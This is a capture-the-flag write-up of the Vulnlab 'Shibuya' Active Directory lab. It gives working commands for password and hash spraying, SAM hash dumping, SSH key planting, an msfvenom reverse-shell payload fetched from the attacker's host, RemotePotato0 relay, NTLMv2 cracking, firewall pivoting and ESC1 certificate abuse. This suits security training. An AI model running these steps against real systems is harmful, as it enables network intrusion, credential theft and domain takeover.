---
title: VL Shibuya
published: 2025-10-31
description: Shibuya is a Windows Active Directory Hard machine from Vulnlab, we will learn Reconnaissance | Password Spraying | Dumping hashes locally | Hash Spraying | Hijacking SSH authorized_keys | BloodHound enumeration | Cross-Session DCOM Relay Attack | Cracking Nigel's hash | Port Forwarding | Firewall Evasion | Finding Vulnerable ADCs | Exploiting ESC1
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a4722e1f824f8f6349259f75e597acd3.png
tags: [Active Directory, Hard, Vulnlab]
category: Writeup
draft: false
---

# Shibuya

Today we're doing Shibuya, a VulnLab **Hard** Machine meant will teach you *Kerberos Password Spraying*, *LDAP Enumeration*, *SMB Shares enumeration*, *cracking images & extracting crucial windows database files,* Hash spraying over kerberos, *hijacking FTP authorized keys*, port forwarding, *Cross-Session DCOM Relay* in order to exploit an active session on the **DC**, and finally *exploiting ADCs (ESC1)*&#x20;

# Reconnaissance

Let's start by checking what **TCP Ports** are accessible

```bash
sudo nmap -p- --open -Pn -n --min-rate 5000 -sV -sS 10.129.86.78
```

```bash
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-31 10:26:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53983/tcp open  msrpc         Microsoft Windows RPC
56287/tcp open  msrpc         Microsoft Windows RPC
57807/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57817/tcp open  msrpc         Microsoft Windows RPC
63162/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only by seeing the open **TCP Ports** we can already tell we're facing the **DC** (Domain Controller), we also see a non-regular port when talking about  Domain Controllers: `TCP 22 (SSH)` let's try to enumerate the domain using `netexec`&#x20;

```bash
sudo netexec smb 10.129.86.78 --generate-hosts-file /etc/hosts
```

This will generate automatically our `/etc/hosts` configuration as shown:

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FulGx4duZwtItC5iHrPte%2Fimage.png?alt=media&#x26;token=99be9a0b-6d8b-4631-ba86-2bb8da4ff228" alt=""><figcaption></figcaption></figure>

Now let's run a user enumeration attack in the background on the `TCP Port 88 (Kerberos)` to fuzz and validate domain users, we'll use the `xat-net-10-million-usernames.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists) repository

```bash
kerbrute userenum --dc 10.129.86.78 -d shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

And quickly, some users appear&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FVjncABWNLfK9k8rDsZX5%2Fimage.png?alt=media&#x26;token=d8305ae8-7408-4182-aa4c-ee0ee0819ec7" alt=""><figcaption></figcaption></figure>

Let's export these users into a `users.txt` file, don't forget to add a blank line on the file so in further fuzzing it also tries with **NULL passwords and usernames**

Now let's try to recon the `TCP 445 (SMB)` port using `netexec` with the use of a **NULL Session** in order to list more shares, users, groups, etc...

```bash
nxc smb -u '' -p ''
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F28QnnMBE4vXHel1Y0vc9%2Fimage.png?alt=media&#x26;token=c04f8b1c-4da9-479a-87f6-630029654767" alt=""><figcaption></figcaption></figure>

But it seems that the service is not accepting **NULL sessions** as an option

# Password Spraying

So let's try to use their names as their password as this is the first natural step when finding valid domain users, we'll use `netexec` for this

```bash
nxc smb shibuya.vl -u users.txt -p users.txt --continue-on-success -k
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FoeG0A4zyNbm5AwDEKpjP%2Fimage.png?alt=media&#x26;token=dd2e1e03-2fb6-475c-b101-5693ee6f9928" alt=""><figcaption></figcaption></figure>

We seem to get two hits when using the `-k` parameter, now we can try and enumerate shares, users, groups and so on with these users

```bash
nxc smb shibuya.vl -u 'red' -p 'red' --users -k
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FWN0gpTKTSaJOkSXWiQWA%2Fimage.png?alt=media&#x26;token=8d63c0d5-9db4-460b-8541-0488cdb579be" alt=""><figcaption></figcaption></figure>

We get a unusual comment on the `svc_autojoin` account with a string that is likely a password: `K5&A6Dw9d8jrKWhV`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FnNtjMs9fKqLmfQ7SkDDC%2Fimage.png?alt=media&#x26;token=a47f6f8e-6654-4c13-a22e-7241bd1c9d30" alt=""><figcaption></figcaption></figure>

We validate it and see that it's correct so let's move on to getting all users written down

We will get a massive amount of users (around 500), so we need to export all these users into a list, we'll use our knowledge on regex to export these into our `users.txt` file&#x20;

```bash
nxc smb shibuya.vl -u 'red' -p 'red' --rid-brute -k | grep "SidTypeUser" | awk -F'SHIBUYA\\\\' '{print $2}' | awk '{print $1}' > users.txt
```

```bash
wc -l users.txt
507 users.txt
```

And here we see that we're facing with exactly **507** users which is definitely a lot

Now let's enumerate shares using the credentials that we found when enumerating users previously

```bash
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --shares
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FwChNOXXbklK8ud58Zdcc%2Fimage.png?alt=media&#x26;token=261c5d27-b51e-4036-949d-3beb6885108a" alt=""><figcaption></figcaption></figure>

we have access to two non-regular shares: `users` and `images$` but we will enumerate all of them with the use of the spider\_plus module inside of `netexec` what this module does is that it **Spiders Shares** enumerating all files and content on it on a more fast and automatic way

``` bash
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k -M spider_plus
```

And the crawl was successfully exported to the `spider_plus` folder

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FgBwib7MG7UcpzUJ0uHpg%2Fimage.png?alt=media&#x26;token=09bfa4f4-f05d-410a-a305-88e053042989" alt=""><figcaption></figcaption></figure>

Here we see a total of 4 interesting files on the images$ share:&#x20;

```c
AWSJPWK0222-01.wim
AWSJPWK0222-02.wim
AWSJPWK0222-03.wim
vss-meta.cab
```

I'll be downloading these using `netexec` again on a  new folder called images&#x20;

```bash
mkdir images && cd images
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --share images$ --get-file AWSJPWK0222-01.wim AWSJPWK0222-01.wim
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --share images$ --get-file AWSJPWK0222-02.wim AWSJPWK0222-02.wim
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --share images$ --get-file AWSJPWK0222-03.wim AWSJPWK0222-03.wim
nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' -k --share images$ --get-file vss-meta.cab vss-meta.cab
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fzd4f14LRqL4N6sRKzOo4%2Fimage.png?alt=media&#x26;token=7d9dd70e-858b-4b24-98d3-a46813a99cb2" alt=""><figcaption></figcaption></figure>


# Dumping hashes locally

We'll use the `Thunar File Manager` to inspect what's inside these compressed files

<figure><img src="https://delorian.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F3550432212-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FgxTXO9Ixrx4ExK6jnMbc%252Fuploads%252F7hoEyD6MdSWdrBIR99uL%252Fimage.png%3Falt%3Dmedia%26token%3Dec88a71a-8702-48bb-8bf6-f5a1039b9a58&width=768&dpr=1&quality=100&sign=d6e2f034&sv=2"> <figcaption></figcaption></figure>

The file that stands out most is `AWSJPWK0222-02.wim` as it contains the `SAM` file as well as the `SYSTEM` file, we can dump existent **hashes** on this using `impacket-secretsdump` , you need to also do the labour to inspect all of these files in order to see if there's something more important, but in this case I'll tell you beforehand that no

So let's decompress that file and dump these `hashes`!

```bash
7z x AWSJPWK0222-02.wim
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local > dump.txt
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FrIr3eiovtfgXyCUMJzpU%2Fimage.png?alt=media&#x26;token=7138cfe8-8294-4290-9b9d-288b718d4105" alt=""><figcaption></figcaption></figure>

We see a total of 5 hashes that we may try

```powerquery
Administrator  -  8dcb5ed323d1d09b9653452027e8c013
Guest          -  31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount -  31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtility    -  9dc1b36c1e31da7926d77ba67c654ae6
operator       -  5d8c3d1a20bd63f60f469f6763ca0d50
```

Also there's the Administrator hash, but, this time it wont work (Yeah, I've tried it)

# Hash Spraying

We can try to perform a `Hash Spraying Attack` with these *hashes,* starting off with the non-default account: **operator's** hash&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FHxBhdM2z38M4VS1YsoES%2Fimage.png?alt=media&#x26;token=be118d1e-590a-4894-a166-017076d59862" alt=""><figcaption></figcaption></figure>

After many tries we get a hit as `Simon.Watson` with the operator's hash `5d8c3d1a20bd63f60f469f6763ca0d50`&#x20;

However the credentials don't seem valid on `winrm` and neither on `ldap`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FGQ8CiWjpqFT6PwC2bYD8%2Fimage.png?alt=media&#x26;token=457c6032-9301-4323-9b7e-0f7e6182c697" alt=""><figcaption></figcaption></figure>

Let's try to access to the SMB service using `smbclient.py`&#x20;

```bash
smbclient.py simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
```

Crawling a bit throughout the shares, we see that we can already retrieve the user flag from the simon.watson directory, as we now have access to it&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FC8auQ8hcTdTEPa9X5kF9%2Fimage.png?alt=media&#x26;token=ca9b0457-bdd6-4076-ad7e-cc9c130ff6d5" alt=""><figcaption></figcaption></figure>

# Hijacking SSH authorized\_keys

Remember we had access to `SSH` on the **DC**? we can hijack this user's authorized\_keys in order to access on the system using **SSH**&#x20;

On our attacker linux system

```bash
ssh-keygen -t ed25519 -f simon -C "simon"
mv simon.pub authorized_keys
chmod 0600 simon
```

On the victim's SMB access

```bash
pwd
### Here it needs to show /simon.watson
mkdir .ssh
cd .ssh
put authorized_keys
```

And now if everything went correct we can SSH using the key we generated

```bash
ssh -i simon simon.watson@shibuya.vl
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FHhy8Iatsipw6yw7SMqk1%2Fimage.png?alt=media&#x26;token=ac10dcc2-9e58-49c7-bf88-91ff50f93d7f" alt=""><figcaption></figcaption></figure>

# BloodHound enumeration

We're in! (finally) now let's try to recollect information onto our bloodhound using the SharpHound.exe collector, but first let's settle up our `Bloodhound-Ce`&#x20;

```basic
bloodhound-cli up
```

&#x20;you can download `SharpHound` it right here:

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FMWRyUODm74FqxjkmSMut%2Fimage.png?alt=media&#x26;token=1f42f6dd-8286-4b5d-afef-92f0cdb69be0" alt=""><figcaption></figcaption></figure>

To make this easier let's use a framework like `metasploit` in order to transfer files from our host to the target **DC** first let's craft our payload using `msfvenom`&#x20;

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.96 LPORT=443 -f exe -o rev.exe
```

Then from our attacker `linux` machine with a `python server` let's upload it to the target

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then on the target machine let's download it using `curl` as it's already pre-installed&#x20;

```bash
curl http://10.10.14.96/rev.exe -o C:\Users\simon.watson\Desktop\rev.exe
```

Now set up our listener in `msf` and configure it

``` bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F1oy5Nnc4Vh6HHgHrUyzS%2Fimage.png?alt=media&#x26;token=84d097ae-dcbe-4757-94b8-c42bbcb55ade" alt=""><figcaption></figcaption></figure>

Now we can transfer files with no effort on the target

Let's now finally  upload our `SharpHound.exe` using `upload` and extract all  the available information using the command

```powershell
.\SharpHound.exe -c All
```

And then download the generated zip&#x20;

```bash
download 20251031050947_BloodHound.zip
```

And in `BloodHound` we can just ingest it comfortably

But in Simon Watson's outbound object control we don't see anything special

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FUBlOjLJDMwp8l3MkrPq5%2Fimage.png?alt=media&#x26;token=16ab79f8-72e1-4ad7-a84c-56faa23bea3f" alt=""><figcaption></figcaption></figure>

We can try looking for vulnerable certificates using `certipy` but I'll tell you beforehand it doesn't work

After a lot of enumeration, we see something interesting, in the sessions part we see two active sessions, one being ourselves and the other one being another user: `Nigel.Mills`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FOx6ZAsFhqUrIcxBOzkhy%2Fimage.png?alt=media&#x26;token=cddb1a36-7495-40b5-a856-9f9d67729cdd" alt=""><figcaption></figcaption></figure>

We can also see he's part of a group called `T1_ADMINS`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FZUeEg9qx0D5T7mXjKV7N%2Fimage.png?alt=media&#x26;token=07240012-6ea4-4eb5-8a8f-57bd92ca3529" alt=""><figcaption></figcaption></figure>

Why is this important? Because there's a vulnerability called **Cross-Session DCOM Relay Attack** which we will see now

# Cross-Session DCOM Relay Attack

The presence of Nigel.Mills in the T1\_ADMINS group creates a prime exploitation scenario. As a **Tier 1 administrator**, this user possesses elevated *domain privileges*, making their session an ideal target for credential theft.

:::note
DCOM, or Distributed Component Object Model, is a [Microsoft technology](https://www.google.com/search?client=firefox-b-d\&q=Microsoft+technology\&mstk=AUtExfDWkOsnc58HaTHydsThSKUA7KzcOPhao5bXaNdqSjR1yf54i42vEEfyfqHZavFO_ZgjlIOsAFzNtYwMECfnj813b3QpZT6SjItkVPK0a8ZAbxEmeBtZAIKkz1KinW2h289cxGS10q7nuhaRpNP1h9bCIrqBHFqgo7ecMtdZBNQ5Rb3eGemvGYKAJxXpds6jsko1cnQiYvirefriu3t2OeNZIRqdw7gMzGFHrICE_d64A_AZktsIxDzG854ulWAlMdZKZsVx6Gus8GaIS_QMX4laFEsmVbFxYmTXe6VWGVuwAj-z6_d4UB_bk3qVY2izxQ\&csui=3\&ved=2ahUKEwjX-v2fuc6QAxUVQvEDHbBFHK8QgK4QegQIARAE) that allows software components to communicate across a network
:::

**Attack Execution**

We leverage the Cross-Session `DCOM` Relay technique using `RemotePotato0`, specifying Nigel's session to precisely target their authentication traffic. The attack workflow proceeds as follows:

1. **Deployment**: Execute RemotePotato0 with parameters targeting session 2 (Nigel's session)
2. **Trigger**: Force `DCOM` authentication from Nigel's context to our rogue `OXID` resolver
3. **Capture**: Intercept the `NTLMv2` authentication handshake
4. **Relay**: Forward captured credentials to gain elevated access

First we need to download `RemotePotato0` from it's **GitHub** <https://github.com/antonioCoco/RemotePotato0> and then upload it to the machine using `msf's` **upload** command&#x20;

On the attacker's machine we're going to execute the following command which creates a local port forwarder and listens on `TCP 135` and forwards all traffic to `TCP 8888`&#x20;

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.86.78:8888
```

And in the victim machine we'll use the exploit pointing to our `tun0` **IP** on port 8888

```bash
.\RemotePotato0.exe -m 2 -r 10.10.14.96 -x 10.10.14.96 -p 8888 -s 1
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FiUMQFxopFW6RGzejulFE%2Fimage.png?alt=media&#x26;token=c344e5bb-84cc-41df-935c-7a022713031c" alt=""><figcaption></figcaption></figure>

# Cracking Nigel's hash

And there we have our stolen `NTLMv2` hash, let's crack it using  `john`&#x20;

```bash
echo 'Nigel.Mills::SHIBUYA:98e01af42ed23792:434bcf598e01fc80af0d07caae57cb63:01010000000000003950faaa634adc01a55e27d1d3493ae30000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c00070008003950faaa634adc010600040006000000080030003000000000000000010000000020000026ae38f83aab21af616b983b588815d6ac841b2138d1c0211992cd17a33bdc0e0a00100000000000000000000000000000000000090000000000000000000000' > hash.txt
john -w=/usr/share/seclists/rockyou.txt hash.txt
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F21mqrof8f0dI5Ns57FWr%2Fimage.png?alt=media&#x26;token=20be9447-115e-4259-bfba-84af36724247" alt=""><figcaption></figcaption></figure>

And the cracked password it's `Sail2Boat3`&#x20;

# Exploiting Vulnerable ADCs

Now we see Nigel's outbound objects on `BloodHound`&#x20;

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FvPjBWeSOoeadM0qg7WFJ%2Fimage.png?alt=media&#x26;token=0f926e63-30a7-46c2-a328-6b8b11300eff" alt=""><figcaption></figcaption></figure>

We see a new cert called `SHIBUYAWEB` which is accessible by the `T1_ADMINS` group, let's try to find vulnerable  templates now with the credentials we just managed: `nigel.mills:Sail2Boat3` using `certipy`&#x20;

```bash
certipy find -u nigel.mills@shibuya.vl -p 'Sail2Boat3' -dc-ip 10.129.86.78 -vulnerable -stdout
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fcv2QDO1Tvn6RyOVm0uNk%2Fimage.png?alt=media&#x26;token=19c5e318-630a-44c0-ae88-8bd8f18f6042" alt=""><figcaption></figcaption></figure>

But as we can see if we try to execute this command it will lend us an error since there's a firewall blocking our connection, let's use `proxychains` in order to do this from inside of the **network**&#x20;

First, set up our `SSH` **listener** on port `1080`&#x20;

```bash
ssh -D 1080 nigel.mills@shibuya.vl
```

Now let's verify if our `proxychains.conf` has this port configured also

```bash
tail /etc/proxychains.conf
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FkjTtCNduRDsH1cFnK9qc%2Fimage.png?alt=media&#x26;token=630881c4-403d-4fc2-a2a3-9bfc3a37fe63" alt=""><figcaption></figcaption></figure>

And we confirm that it is, so now we can repeat our command but pointing at `localhost` since we're technically inside the network when using `proxychains`

```bash
proxychains certipy find -u nigel.mills@shibuya.vl -p 'Sail2Boat3' -dc-ip 127.0.0.1 -vulnerable -stdout
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F14fYnMqpOTTmB5Qfbhxf%2Fimage.png?alt=media&#x26;token=88f7cf38-1198-4dcb-9395-db88da9df7ac" alt=""><figcaption></figcaption></figure>

We see that the `ShibuyaWeb` template that we saw earlier is vulnerable to 3 `ESCs` &#x20;

```bash
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Let's try to exploit ESC1 as it's the most straight-forward one, so let's request the `_admin's` UPN specifying his SID

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FnEX6W9GG8NDXMdSHEmTs%2Fimage.png?alt=media&#x26;token=c3712ba8-aca1-4096-99e6-a61b99676614" alt=""><figcaption></figcaption></figure>

```bash
proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FsLmOSSqx6KOJuqRFrDu0%2Fimage.png?alt=media&#x26;token=edc49eca-7035-487e-ba76-de0868080f84" alt=""><figcaption></figcaption></figure>

Now we can request it's NT hash using the `_admin.pfx` we just obtained

```bash
proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1 -domain shibuya.vl
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FuNtdEfNeRDK1vo5SNw23%2Fimage.png?alt=media&#x26;token=0896447a-c662-4214-8038-a2e3c7792a90" alt=""><figcaption></figcaption></figure>

And we successfully got the `NT hash`!!!

Now let's authenticate through `Evil-Winrm` using this hash and using `proxychains` to evade the firewall

```bash
proxychains evil-winrm -i localhost -u '_admin' -H 'bab5b2a004eabb11d865f31912b6b430'
```

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fzu56pKvI4bRGsC9vroV1%2Fimage.png?alt=media&#x26;token=47fc4561-126a-4cee-8249-92549ed3bf68" alt=""><figcaption></figcaption></figure>

And with this, the machine is completed, hope you liked it and thank you a lot for reading this `writeup`!
